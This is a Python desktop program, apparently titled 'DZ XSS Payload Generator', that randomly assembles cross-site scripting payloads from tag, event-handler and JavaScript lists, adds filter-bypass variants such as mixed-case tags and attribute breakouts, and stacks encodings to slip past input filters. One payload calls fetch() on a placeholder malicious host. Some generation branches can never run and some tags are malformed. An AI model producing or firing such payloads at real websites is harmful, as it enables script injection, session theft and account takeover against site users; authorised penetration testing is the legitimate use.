import tkinter as tk
from tkinter import ttk, messagebox
import pyperclip
import random
import base64
import urllib.parse
import html
import binascii
import ttkbootstrap as tb

# XSS Payload components
tags = [
	"script", "img", "svg", "iframe", "body", "a", "input", "div", "p", 
	"button", "video", "audio", "form", "details", "select", "textarea", 
	"meta", "math", "style"
]
attributes = [
	"onerror", "onload", "onclick", "ondragstart", "onmouseover", 
	"onfocus", "ontoggle", "onchange", "http-equiv", "content"
]
values = [
	"alert('XSS')", "javascript:alert('XSS')", "data:text/html,<script>alert('XSS')</script>", 
	"document.write('<img src=x onerror=alert(\\\"XSS\\\")>')", "eval('alert(\\\"XSS\\\")')", 
	"fetch('http://malicious-site.com')", "setTimeout('alert(\\\"XSS\\\")', 1000)", 
	"new Function('alert(\\\"XSS\\\")')()"
]

# Bypass Techniques with various methods like case-sensitivity, HTML entity encoding
tag_bypass_methods = [
	lambda: f"<img src='x' onerror=alert('XSS')>",  
	lambda: f"<img src=javascript:alert('XSS')>",  
	lambda: f"<a href='javascript:alert(\\\"XSS\\\")'>Click Me</a>",  
	lambda: f"<div style='background:url(javascript:alert(\\\"XSS\\\"))'>Test</div>",  
	lambda: f"<body onload='alert(\\\"XSS\\\")'>",  
	lambda: f"<ScRiPt>alert('XSS')</ScRiPt>",  
	lambda: f"<ImG Src='x' OnError=Alert('XSS')>",  
	lambda: f"<ScrIpt src=jaVasCript:alert(\\\"XSS\\\")></ScrIpt>",  
	lambda: f"<svg onload=alert('XSS')></svg>",  
	lambda: f"<InPuT type=text value='XSS' OnClick=alert('XSS')>",  
	lambda: f"<ScripT OnError=alert('XSS')></ScRiPt>",  
]

# Encoding Methods
def encode_base64(payload):
	return base64.b64encode(payload.encode('utf-8')).decode('utf-8')

def encode_url(payload):
	return urllib.parse.quote(payload)

def encode_html(payload):
	return html.escape(payload)

def encode_hex(payload):
	return binascii.hexlify(payload.encode('utf-8')).decode('utf-8')

def encode_unicode(payload):
	return ''.join(f"\\u{ord(c):04x}" for c in payload)

def encode_html_entities(payload):
	return ''.join(f"&#{ord(c)};" for c in payload)

def encode_js_escape(payload):
	return payload.replace("'", "\\'").replace('"', '\\"').replace("<", "\\u003C").replace(">", "\\u003E")

def encode_js_unicode(payload):
	return ''.join([f"\\u{ord(c):04x}" for c in payload])

def encode_unsafe_chars(payload):
	return payload.replace("<", "%3C").replace(">", "%3E").replace("'", "%27").replace('"', "%22")

def encode_css(payload):
	return payload.replace("(", "\\28").replace(")", "\\29").replace("'", "\\27").replace('"', "\\22")

# Method to encode the payload
def encode_payload(payload):
	encoded_payload = payload
	if encode_base64_var.get():
		encoded_payload = encode_base64(encoded_payload)
	if encode_url_var.get():
		encoded_payload = encode_url(encoded_payload)
	if encode_html_var.get():
		encoded_payload = encode_html(encoded_payload)
	if encode_hex_var.get():
		encoded_payload = encode_hex(encoded_payload)
	if encode_unicode_var.get():
		encoded_payload = encode_unicode(encoded_payload)
	if encode_html_entities_var.get():
		encoded_payload = encode_html_entities(encoded_payload)
	if encode_js_escape_var.get():
		encoded_payload = encode_js_escape(encoded_payload)
	if encode_js_unicode_var.get():
		encoded_payload = encode_js_unicode(encoded_payload)
	if encode_unsafe_chars_var.get():
		encoded_payload = encode_unsafe_chars(encoded_payload)
	if encode_css_var.get():
		encoded_payload = encode_css(encoded_payload)
	
	return encoded_payload

# Function to generate payload
def generate_payload():
	method = random.randint(1, 20)
	tag = random.choice(tags)
	attr = random.choice(attributes)
	value = random.choice(values)
	
	if method <= 10:
		# Normal generation
		if method == 1:
			payload = f"<{tag} {attr}={value}>"
		elif method == 2:
			payload = f"<{tag} src='x' {attr}={value}>"
		elif method == 3:
			payload = f"<{tag} {attr}='{value}'>"
		elif method == 4:
			payload = f"<{tag} style='background:url(javascript:{value})'>Test</{tag}>"
		elif method == 5:
			payload = f"<script>{value}</script>"
		elif method == 6:
			payload = f"\\\"><{tag} {attr}={value}>"
		elif method == 7:
			payload = f"<a href='{value}'>Click Me</a>"
		elif method == 8:
			payload = f"<input type=text value='XSS' {attr}={value}>"
		elif method == 9:
			payload = f"<{tag} src='javascript:{value}'>"
		elif method == 10:
				payload = f"<{tag}><{tag} {attr}='{value}'></tag>"
		elif method == 11:
				payload = f"<{tag}|{tag} {attr}='{value}'></tag>"
		elif method == 12:
				payload = f"<{tag}>POC<{tag} {attr}='{value}'></tag>"
		elif method == 13:
						payload = f"aaaaaaaaaaaaaaaaaaaaaaaa\\\"><{tag} {attr}={value}>"
		elif method == 14:
						payload = f"\\\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa><{tag} {attr}={value}>"

		else:
				payload = f"<iframe src='javascript:{value}'></iframe>"
	else:
		# Bypass methods
		bypass_functions = [lambda: f"<img src='x' onerror=alert('XSS')>", 
							 lambda: f"<img src=javascript:alert('XSS')>", 
							 lambda: f"<a href='javascript:alert(\\\"XSS\\\")'>Click Me</a>", 
							 lambda: f"<div style='background:url(javascript:alert(\\\"XSS\\\"))'>Test</div>", 
							 lambda: f"<body onload='alert(\\\"XSS\\\")'>", 
							 lambda: f"<ScRiPt>alert('XSS')</ScRiPt>", 
							 lambda: f"<ImG Src='x' OnError=Alert('XSS')>", 
							 lambda: f"<ScrIpt src=jaVasCript:alert(\\\"XSS\\\")></ScrIpt>", 
							 lambda: f"<svg onload=alert('XSS')></svg>", 
							 lambda: f"<InPuT type=text value='XSS' OnClick=alert('XSS')>", 
							 lambda: f"<ScripT OnError=alert('XSS')></ScRiPt>"]
		payload = random.choice(bypass_functions)()

	encoded_payload = encode_payload(payload)
	
	selected_payload.set(encoded_payload)
	payloads_list.insert(tk.END, encoded_payload)

# Function to copy payload to clipboard
def copy_to_clipboard():
	pyperclip.copy(selected_payload.get())
	messagebox.showinfo("Copied", "Payload copied to clipboard!")

# Function to show splash screen
def show_splash():
	splash = tk.Toplevel(root)
	splash.title("Loading...")
	splash.configure(bg='black')

	# Center the window with size 600x500
	window_width = 500
	window_height = 300
 
	# Get screen width and height 
	screen_width = splash.winfo_screenwidth()
	screen_height = splash.winfo_screenheight()
 
	# Calculate position for centering
	position_top = int(screen_height / 2 - window_height / 2)
	position_left = int(screen_width / 2 - window_width / 2)

	# Set the geometry of the window
	splash.geometry(f"{window_width}x{window_height}+{position_left}+{position_top}")

	label = tk.Label(splash, text="DZ XSS Payload Generator", fg='white', bg='black', font=('Helvetica', 16))
	label.pack(pady=30)

	progress = ttk.Progressbar(splash, length=300, mode='indeterminate')
	progress.pack(pady=20)
	progress.start()

	# Simulate waiting for a few seconds
	splash.after(3000, lambda: [splash.destroy(), root.deiconify()])  # Close splash screen after 3 seconds
	splash.mainloop()



# Initialize Tkinter Window
root = tb.Window(themename="darkly")
root.title("XSS Payload Generator")
root.geometry("500x450")


# Frame
frame = ttk.Frame(root, padding=10)
frame.pack(expand=True, fill='both')

# Listbox for Payloads
payloads_list = tk.Listbox(frame, height=12, selectmode=tk.SINGLE, bg='#222', fg='lime', font=("Courier", 12))
payloads_list.pack(fill='x', pady=5)

selected_payload = tk.StringVar()

# Encoding Checkboxes
encode_base64_var = tk.BooleanVar()
encode_url_var = tk.BooleanVar()
encode_html_var = tk.BooleanVar()
encode_hex_var = tk.BooleanVar()
encode_unicode_var = tk.BooleanVar()
encode_html_entities_var = tk.BooleanVar()
encode_js_escape_var = tk.BooleanVar()
encode_js_unicode_var = tk.BooleanVar()
encode_unsafe_chars_var = tk.BooleanVar()
encode_css_var = tk.BooleanVar()

# Checkboxes for encoding options
checkbox_frame = ttk.Frame(frame)
checkbox_frame.pack(fill='x', pady=5)

ttk.Checkbutton(checkbox_frame, text="Base64", variable=encode_base64_var).pack(side="left", padx=5)
ttk.Checkbutton(checkbox_frame, text="URL Encode", variable=encode_url_var).pack(side="left", padx=5)
ttk.Checkbutton(checkbox_frame, text="HTML Encode", variable=encode_html_var).pack(side="left", padx=5)
ttk.Checkbutton(checkbox_frame, text="Hex Encode", variable=encode_hex_var).pack(side="left", padx=5)
ttk.Checkbutton(checkbox_frame, text="Unicode Encode", variable=encode_unicode_var).pack(side="left", padx=5)
ttk.Checkbutton(checkbox_frame, text="HTML Entities Encode", variable=encode_html_entities_var).pack(side="left", padx=5)
ttk.Checkbutton(checkbox_frame, text="JavaScript Escape", variable=encode_js_escape_var).pack(side="left", padx=5)
ttk.Checkbutton(checkbox_frame, text="JavaScript Unicode", variable=encode_js_unicode_var).pack(side="left", padx=5)
ttk.Checkbutton(checkbox_frame, text="Unsafe Characters Encode", variable=encode_unsafe_chars_var).pack(side="left", padx=5)
ttk.Checkbutton(checkbox_frame, text="CSS Encode", variable=encode_css_var).pack(side="left", padx=5)

# Button to generate payload
tt_button = ttk.Button(frame, text="Generate Payload", command=generate_payload)
tt_button.pack(pady=5)

entry = ttk.Entry(frame, textvariable=selected_payload, font=("Courier", 12), state='readonly', width=50)
entry.pack(pady=5)

# Copy button
copy_button = ttk.Button(frame, text="Copy to Clipboard", command=copy_to_clipboard)
copy_button.pack(pady=5)

# Center the window with size 600x500
window_width = 1400
window_height = 500

# Get screen width and height
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()

# Calculate position for centering
position_top = int(screen_height / 2 - window_height / 2)
position_left = int(screen_width / 2 - window_width / 2)

# Set the geometry of the window
root.geometry(f"{window_width}x{window_height}+{position_left}+{position_top}")
# Run Tkinter main loop
# Show splash screen
show_splash()
root.mainloop()

